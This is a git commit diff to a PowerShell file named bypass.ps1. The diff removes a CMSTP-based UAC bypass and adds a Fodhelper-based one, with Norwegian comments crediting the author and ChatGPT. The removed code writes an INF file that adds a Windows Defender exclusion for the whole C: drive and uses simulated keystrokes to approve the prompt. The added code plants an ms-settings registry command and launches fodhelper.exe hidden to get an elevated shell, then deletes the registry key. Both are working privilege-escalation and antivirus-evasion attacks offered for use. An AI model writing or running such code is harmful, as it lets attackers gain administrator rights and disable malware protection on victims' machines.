6fe977dfbc0ae91e1e0373994ff2eb4167401031
Samatar <samatar0509@gmail.com>
2025-04-26 12:51:06 +0200

    Update bypass.ps1

--- bypass.ps1
+++ bypass.ps1
@@ -1,132 +1,17 @@
-Function script:Set-INFFile {
-[CmdletBinding()]
-	Param (
-	[Parameter(HelpMessage="Specify the INF file location")]
-	$InfFileLocation = "$env:temp\CMSTP.inf",
-	
-	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Add-MpPreference -ExclusionPath "C:\"'
-	)
+# Fodhelper UAC Bypass Script
+# Av: Samat og ChatGPT :)
 
-$InfContent = @"
-[version]
-Signature=`$chicago`$
-AdvancedINF=2.5
+# Sett hvilket program du vil kjøre som administrator
+$program = "cmd.exe /c start powershell.exe"  # Endre hvis du vil
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
+# Lag nødvendig registerstruktur
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
-[RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
-$CommandToExecute
-taskkill /IM cmstp.exe /F
+# Start fodhelper.exe for å trigge bypass
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-
-[AllUSer_LDIDSection]
-"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
-
-[Strings]
-ServiceName="CorpVPN"
-ShortSvcName="CorpVPN"
-
-"@
-
-$InfContent | Out-File $InfFileLocation -Encoding ASCII
-}
-
-
-Function Get-Hwnd
-{
-  [CmdletBinding()]
-    
-  Param
-  (
-    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
-  )
-  Process
-    {
-        $ErrorActionPreference = 'Stop'
-        Try 
-        {
-            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
-        }
-        Catch 
-        {
-            $hwnd = $null
-        }
-        $hash = @{
-        ProcessName = $ProcessName
-        Hwnd        = $hwnd
-        }
-        
-    New-Object -TypeName PsObject -Property $hash
-    }
-}
-
-function Set-WindowActive
-{
-  [CmdletBinding()]
-
-  Param
-  (
-    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
-  )
-  
-  Process
-  {
-    $memberDefinition = @'
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
-
-'@
-
-    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
-    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
-    If ($hwnd) 
-    {
-      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
-      [User32.Api]::SetForegroundWindow($hwnd)
-      [User32.Api]::ShowWindow($hwnd, 5)
-    }
-    Else 
-    {
-      [string] $hwnd = 'N/A'
-    }
-
-    $hash = @{
-      Process = $Name
-      Hwnd    = $hwnd
-    }
-        
-    New-Object -TypeName PsObject -Property $hash
-  }
-}
-
-. Set-INFFile
-#Needs Windows forms
-add-type -AssemblyName System.Windows.Forms
-If (Test-Path $InfFileLocation) {
-#Command to run
-$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
-$ps.Arguments = "/au $InfFileLocation"
-$ps.UseShellExecute = $false
-
-#Start it
-[system.diagnostics.process]::Start($ps)
-
-do
-{
-	# Do nothing until cmstp is an active window
-}
-until ((Set-WindowActive cmstp).Hwnd -ne 0)
-
-
-#Activate window
-Set-WindowActive cmstp
-
-#Send the Enter key
-[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-}
+# Vent litt og rydd opp
+Start-Sleep -Seconds 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
